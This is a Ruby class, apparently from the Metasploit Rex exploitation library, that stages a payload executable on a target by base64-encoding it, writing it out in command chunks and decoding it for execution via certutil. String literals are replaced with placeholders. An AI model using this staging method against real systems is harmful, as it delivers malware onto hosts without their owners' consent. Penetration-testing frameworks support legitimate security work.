require <str> require <str> require <str> module Rex module Exploitation class CmdStagerCertutil < CmdStagerBase def initialize ( exe ) super @var_encoded = Rex :: Text . rand_text_alpha ( <int> ) @var_decoded = Rex :: Text . rand_text_alpha ( <int> ) @decoder = nil end def generate_cmds ( opts ) @cmd_start = <str> @cmd_end = <str> @tempdir <str> @var_encoded <str> xtra_len = @cmd_start . length + @cmd_end . length + <int> opts . merge! ( { <str> = > xtra_len } ) super end def encode_payload ( opts ) Rex :: Text . encode_base64 ( @exe ) end def parts_to_commands ( parts , opts ) cmds = [ ] parts . each do | p | cmd = <str> cmd << @cmd_start cmd << p cmd << @cmd_end cmds << cmd end cmds end def generate_cmds_decoder ( opts ) cmds = [ ] cmds << <str> @tempdir <str> @var_encoded <str> @tempdir <str> @var_decoded <str> return cmds end def compress_commands ( cmds , opts ) cmds << <str> @tempdir <str> @var_decoded <str> if ( not opts [ <str> ] ) cmds << <str> @tempdir <str> @var_encoded <str> end super end def cmd_concat_operator <str> end end end end 
